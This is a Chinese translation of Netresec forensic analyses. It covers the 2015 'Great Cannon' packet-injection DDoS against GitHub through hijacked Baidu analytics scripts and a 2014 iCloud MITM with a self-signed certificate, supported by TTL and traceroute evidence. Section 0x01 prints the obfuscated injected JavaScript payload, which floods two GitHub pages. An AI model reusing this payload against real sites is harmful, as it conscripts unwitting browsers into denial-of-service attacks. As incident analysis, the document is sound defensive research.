# 对github的中间人攻击

0x00 简介
=======

* * *

source: http://www.netresec.com/?page=Blog&month=2015-03&post=China%27s-Man-on-the-Side-Attack-on-GitHub

![enter image description here](http://drops.javaweb.org/uploads/images/71b8af465a42ad3295e693a41506ea0d36cd20f8.jpg)

3月27号github官方发布[公告](https://github.com/blog/1981-large-scale-ddos-attack-on-github-com)

```
我们正在遭受github历史上最大的DDOS(分布式拒绝服务)攻击，攻击从3月26号，周四下午两点开始，攻击手段组合了多种攻击方式，从一些老式的攻击手段到新式，通过浏览器让毫不相干的围观群众参与到对github攻击流量的贡献，根据我们收到的报告推断，我们相信攻击的目的是让我们删除某些特定的内容。

```

我们根据对网络攻击的观察可以推断出某大型组织使用一些被动和主动的网络设备来执行数据包注入攻击，就是中间人攻击来启动干死github，可以参考文章末尾的链接`TTL analysis`来了解我们如何推断这是一个中间人攻击。

简单来说，中间人攻击的流程如下：

1.  一个不在中国无辜的用户进入了互联网
    
2.  无辜用户进入的网站从中国的服务器加载了一个javascript文件。（比如百度统计的脚本）
    
3.  浏览器对于百度js的请求会被某国的被动设置检测到其请求进入中国。
    
4.  返回一个伪造的响应(注入三个数据包)，而不是真正的百度统计脚本，就是说返回的是一个恶意的js脚本，导致用户浏览器不断请求github上两个特殊的页面。
    

不过，并非所有加载该脚本的中国用户都会进行攻击，根据我们分析，大概只有1% 加载了百度分析的用户会收到恶意js作为返回，其他都为正常行为。

我们用了一个简单的办法让浏览器加载恶意脚本，就是让浏览器去访问一些中国网站，加载了恶意js后，下面是我们在网络流量中观察到的恶意行为。

![enter image description here](http://drops.javaweb.org/uploads/images/42127b22166d7e40dfe974054caad8cf93695d30.jpg)

工具[CapLoader](http://caploader.com/)

该脚本导致我们浏览器不断循环访问 github (IP address 192.30.252.[128-131])

0x01 百度统计
=========

* * *

百度统计脚本会加载url像酱紫

```
http://hm.baidu.com/h.js?0deadbeef000deadbeef000deadbeef0 正常版
http://hm.baidu.com/hm.js?0deadbeef000deadbeef000deadbeef0 异步版

```

正常情况下请求百度脚本是张这个样子的

![enter image description here](http://drops.javaweb.org/uploads/images/219136bff95d93474299e4bb4945bcdf5f1e9627.jpg)

注入后的恶意脚本是张这个样子的

![enter image description here](http://drops.javaweb.org/uploads/images/e2f6d8f1f208ada95c367e755a49e8eac34aaea9.jpg)

注入后的响应每次的表现都是一样的，注入的三个数据包是下面这个样子的。

**_Injected packet #1:_**

```
HTTP/1.1 200 OK
Server: Apache
Connection: close
Content-Type: text/javascript
Content-Length: 1130

```

**_Injected packet #2:_**

```
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?\'\':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)r[e(c)]=k[c][/c]||e(c);k=[function(e){return r[e]}];e=function(){return\'\\\\w+\'};c=1};while(c--)if(k[c][/c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c][/c]);return p}(\'l.k("<5 p=\\\'r://H.B.9/8/2.0.0/8.C.t\\\'>\\\\h/5>");!J.K&&l.k("<5 p=\\\'r://L.8.9/8-T.t\\\'>\\\\h/5>");j=(6 4).c();7 g=0;3 i(){7 a=6 4;V 4.Z(a.10(),a.w(),a.x(),a.11(),a.y(),a.z())/A}d=["m://n.9/E","m://n.9/F-G"];o=d.I;3 e(){7 a=i()%o;q(d[a])}3 q(a){7 b;$.M({N:a,O:"5",P:Q,R:!0,S:3(){s=(6 4).c()},U:3(){f=(6 4).c();b=W.X(f-s);Y>f-j&&(u(b),g+=1)}})}3 u(a){v("e()",a)}v("e()",D);\',62,64,\'|||function|Date|script|new|var|jquery|com|||getTime|url_array|r_send2|responseTime|count|x3c|unixtime|startime|write|document|https|github|NUM|src|get|http|requestTime|js|r_send|setTimeout|getMonth|getDay|getMinutes|getSeconds|1E3|baidu|min|2E3|greatfire|cn|nytimes|libs|length|window|jQuery|code|ajax|url|dataType|timeou

```

**_Injected packet #3:_**

```
t|1E4|cache|beforeSend|latest|complete|return|Math|floor|3E5|UTC|getFullYear|getHours'.split('|'),0,{}))

```

恶意的js是经过混淆的，只需要一些简单的反混淆就可以得到源码。

![enter image description here](http://drops.javaweb.org/uploads/images/23e884b40251579166a53682dc32558276fbcb3d.jpg)

其中可以看到，两个目标url为 github.com/greatfire和github.com/cn-nytimes 这两个均为一个用于规避(GFW)的镜像站点。

0x02 TTL Analysis
=================

* * *

Time-To-Live (TTL) 分析是一种非常有效的手段用于进行中间人攻击的分析，我们用这种方法在之前对于 iCloud, Yahoo, Google和GitHub的攻击上进行分析并且取得了不错的结果。

这次攻击github一个有趣的地方在于，攻击者修改数据包的IP TTL值来致使难以定位恶意数据包的注入点。我们使用Tshark来输出Source-IP, Destination-IP, TCP-Flags和IP-TTL，请看下面箭头记号

```
tshark -r baidu-high-ttl.pcap -T fields -e ip.src -e ip.dst -e tcp.flags -e ip.ttl
192.168.70.160  61.135.185.140  0x0002  64 <- SYN (client)
61.135.185.140  192.168.70.160  0x0012  42 <- SYN+ACK (server)
192.168.70.160  61.135.185.140  0x0010  64 <- ACK (client)
192.168.70.160  61.135.185.140  0x0018  64 <- HTTP GET (client)
61.135.185.140  192.168.70.160  0x0018  227 <- Injected packet 1 (injector)
192.168.70.160  61.135.185.140  0x0010  64
61.135.185.140  192.168.70.160  0x0018  228 <- Injected packet 2 (injector)
61.135.185.140  192.168.70.160  0x0019  229 <- Injected packet 3 (injector)
192.168.70.160  61.135.185.140  0x0010  64
192.168.70.160  61.135.185.140  0x0011  64

```

注意服务器返回的SYN+ACK包的ttl是42，之后三个注入包的ttl值为227, 228和229。

这是另一个PCAP文件解析的结果，这里的ttl值比较低

```
tshark -r baidu-low-ttl.pcap -T fields -e ip.src -e ip.dst -e tcp.flags -e ip.ttl
192.168.70.160  61.135.185.140  0x0002  64 <- SYN (client)
61.135.185.140  192.168.70.160  0x0012  42 <- SYN+ACK (server)
192.168.70.160  61.135.185.140  0x0010  64 <- ACK (client)
192.168.70.160  61.135.185.140  0x0018  64 <- HTTP GET (client)
61.135.185.140  192.168.70.160  0x0018  30 <- Injected packet 1 (injector)
192.168.70.160  61.135.185.140  0x0010  64 
61.135.185.140  192.168.70.160  0x0018  31 <- Injected packet 2 (injector)
61.135.185.140  192.168.70.160  0x0019  32 <- Injected packet 3 (injector)
192.168.70.160  61.135.185.140  0x0010  64 
192.168.70.160  61.135.185.140  0x0011  64

```

服务器的SYN+ACK包的ip ttl值保持在42，但是包含恶意payload的 TTL包保持在30 到229，就是说SYN+ACK是来自百度的服务器，但是注入的恶意包实际上是来自其他的什么地方。

我们之前说过，注入的三个数据包总是相同的，用户会话之间唯一不同的地方是目标的tcp端口，进一步加强了我们认为它是中间人攻击的假设。我们就算直接放弃注入的数据包转为直接从服务器进行请求也没有用。

0x03 其他的恶意js来源
==============

* * *

百度统计并不是唯一数据包被替换成恶意的站点，根据GreatFire.org的[分析报告](https://drive.google.com/file/d/0ByrxblDXR_yqeUNZYU5WcjFCbXM/view?pli=1)，他们发现的url有如下

*   hm.baidu.com/h.js
    
*   cbjs.baidu.com/js/o.js
    
*   dup.baidustatic.com/tpl/wh.js
    
*   dup.baidustatic.com/tpl/ac.js
    
*   dup.baidustatic.com/painter/clb/fixed7o.js
    
*   dup.baidustatic.com/painter/clb/fixed7o.js
    
*   eclick.baidu.com/fp.htm?br= ...
    
*   pos.baidu.com/acom?adn= ...
    
*   cpro.baidu.com/cpro/ui/uijs.php?tu=...
    
*   pos.baidu.com/sync_pos.htm?cproid=...
    

虽然都是百度的域名，不过技术上来说任何某国的站点都可以被用来进行此种类型的攻击。

0x04 更新
=======

* * *

**_4月2日_**

Errata Security的Robert Graham通过进行一次`http-traceroute`验证了我们这次攻击来自某国的理论。[文章](http://blog.erratasec.com/2015/04/pin-pointing-chinas-attack-against.html)

**_4月13日_**

Bill Marczak, Nicholas Weaver, Jakub Dalek, Roya Ensafi, David Fifield, Sarah McKune, Arn Rey, John Scott-Railton, Ronald Deibert和Vern Paxson发布了一份[报告](https://citizenlab.org/2015/04/chinas-great-cannon/)验证了关于奇怪的ttl值的信息，同时他们将这个攻击手段称为`Great Cannon`。

关于GFW TTL边信道可以参考[paper](https://www.usenix.org/system/files/conference/foci14/foci14-anonymous.pdf)

他们还真对GC和GFW的路径进行了一些追踪，

```
对于115.239.210.141  GFW 和GC共同在12和13之间切换，并且在 144.232.12.211和202.97.33.37存在连接，流量属于电信，对于123.125.65.120，两者在17和18之间切换，在219.158.101.61和219.158.101.49存在链接，属于中国联通。

```

这证实了GC位于一个asn，并且之前gfw的一次中间人攻击也位于同样的地方。

研究者发布了一些PCAP文件关于GC和GFW。

*   [gfc_test.tcpdump](http://www1.icsi.berkeley.edu/~nweaver/pcaps/gfc_test.tcpdump)
    
*   [falun_traceroute.tcpdump](http://www1.icsi.berkeley.edu/~nweaver/pcaps/falun_traceroute.tcpdump)
    
*   [eureka.tcpdump](http://www1.icsi.berkeley.edu/~nweaver/pcaps/eureka.tcpdump)(interesting capture file, with injected packets and packets from Baidu in the same TCP session)
    
*   [both_sidechannel.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/both_sidechannel.tcpdump.gz)
    
*   [injector_traceroute.tcpdump](http://www1.icsi.berkeley.edu/~nweaver/pcaps/injector_traceroute.tcpdump)
    
*   [twopaths.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/twopaths.tcpdump.gz)
    
*   [next_ip.tcpdump](http://www1.icsi.berkeley.edu/~nweaver/pcaps/next_ip.tcpdump)
    
*   [stateless_and_cache.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/stateless_and_cache.tcpdump.gz)
    
*   [cache_expire.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/cache_expire.tcpdump.gz)
    
*   [multisender-bigblast.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/multisender-bigblast.tcpdump.gz)
    
*   [multi_ip_blowout.tcpdump.gz](http://www1.icsi.berkeley.edu/~nweaver/pcaps/multi_ip_blowout.tcpdump.gz)
    

0x05 iCloud中国MITM攻击 & 假冒ssl证书
=============================

* * *

ps:下面补充翻译 http://www.netresec.com/?page=Blog&month=2014-10&post=Chinese-MITM-Attack-on-iCloud

中国用户报告了一起对icloud ssl连接的MITM攻击，目的可能在于窃取用户的隐私信息。

在GreatFire，一家监控某国防火墙活动的网站发布过一篇相关的[分析](https://en.greatfire.org/blog/2014/oct/china-collecting-apple-icloud-data-attack-coincides-launch-new-iphone)，他们的博客中链接到一个捕获的数据包数据，为了验证其是否为MITM攻击，我们对其进行了分析，我们将PcapNG文件加载进[NetworkMiner Professional](http://www.netresec.com/?page=Networkminer)并提取了X.509 SSL证书。

![enter image description here](http://drops.javaweb.org/uploads/images/bbcc08b2a791d5130934257e014f509cd692a44f.jpg)

提取的证书[下载地址](http://www.netresec.com/files/www.icloud.com.cer)，下面是一些证书的细节。

```
$ openssl x509 -inform DER -in www.icloud.com.cer -noout -issuer -subject -startdate -enddate -fingerprint
issuer= /C=cn/O=www.icloud.com/CN=www.icloud.com
subject= /C=cn/O=www.icloud.com/CN=www.icloud.com
notBefore=Oct 4 10:35:47 2014 GMT
notAfter=Oct 4 10:35:47 2015 GMT
SHA1 Fingerprint=F4:68:B5:F3:FE:D8:07:97:44:76:A2:2B:32:EA:31:37:D9:24:F7:BA

```

对于自签署证书，浏览器和大多数iphone应用会提醒用户连接是不安全的。这次使用的自签署证书符合之前对 GitHub, Google, Yahoo和live.com的MITM攻击。

0x06 MITM攻击定位
=============

* * *

通过NetworkMiner对于假的ssl服务器的分析我们可以看出，其中离客户端只经过了6个路由器hops，这表明mitm攻击是在中国进行的。

![enter image description here](http://drops.javaweb.org/uploads/images/162e6af60cc602fed5b79e4bfb8a4e9717481352.jpg)

pcap文件中的数据包显示其来自同样的ip，同样的80端口，其中经过了11次的hops(ip ttl 53)，因此我们假设只有通过443端口的流量才有可能为mitm攻击。

之后我们分析了它的ttl，其显示了不同的tcp traceroutes结果，其表示攻击中用到的iCloud SSL服务器位于不同的ip`23.59.94.46:443`

```
My traceroute [v0.85]
siyanmao-k29 (0.0.0.0)                        Sat Oct 18 19:26:07 2014

Host                          Loss% Snt  Last   Avg  Best  Wrst StDev
1. 192.168.1.1                0.0%   17   0.6   0.7   0.6   0.8   0.0
2. -------------              0.0%   16   2.8   2.6   1.7   3.3   0.3
3. -------------              0.0%   16   2.0   2.2   1.4   4.0   0.4
4. ???
5. 119.145.47.78              0.0%   16   6.4   7.7   4.3  27.0   5.2
   183.56.65.54
   183.56.65.50
   119.145.47.74
   121.34.242.250
   121.34.242.138
6. 23.59.94.46               25.0%   16 168.5 171.4 166.8 201.3   9.4

```

[文件地址](http://pastebin.com/8Y6ZwfzG)

这次结果显示攻击出现在中国电信 AS4134

```
bearice@Bearice-Mac-Air-Haswell ~
%tcptraceroute 23.59.94.46 443
Selected device en0, address 192.168.100.16, port 52406 for outgoing packets
Tracing the path to 23.59.94.46 on TCP port 443 (https), 30 hops max
1 192.168.100.254 1.737 ms 0.793 ms 0.798 ms
2 111.192.144.1 2.893 ms 2.967 ms 2.422 ms
3 61.51.246.25 2.913 ms 2.893 ms 3.968 ms
4 124.65.61.157 4.824 ms 2.658 ms 3.902 ms
5 202.96.12.9 3.626 ms 6.532 ms 3.794 ms
6 219.158.96.54 27.539 ms 26.821 ms 27.661 ms
7 a23-59-94-46.deploy.static.akamaitechnologies.com (23.59.94.46) [open] 30.064 ms 29.899 ms 30.126 ms

```

[文件地址](https://gist.github.com/bearice/8f87eb1f87bed8b3b4ee)

当然联通也别想跑

![enter image description here](http://drops.javaweb.org/uploads/images/395007e44f989111ee8ba63198e4aaed18809138.jpg)

[原地址](https://twitter.com/chenshaoju/status/524113869946372096)

Tcproute显示CHINANET骨干网络似乎是主要用于进行攻击的地方。

TCP traceroutes的结果显示，虽然mitm攻击位于几个不同的位置不过集中在中国的互联网基础设施上，具体点说，进行mitm攻击的骨干网络属于电信和联通。